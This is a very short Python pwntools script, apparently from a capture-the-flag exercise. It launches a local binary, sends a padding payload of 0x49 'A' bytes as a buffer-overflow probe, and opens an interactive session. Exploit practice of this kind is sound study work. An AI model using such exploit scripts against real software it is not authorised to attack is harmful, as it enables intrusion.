from pwn import *

p = process('./main')

payload = b'A'*0x49
p.send(payload)


p.interactive()
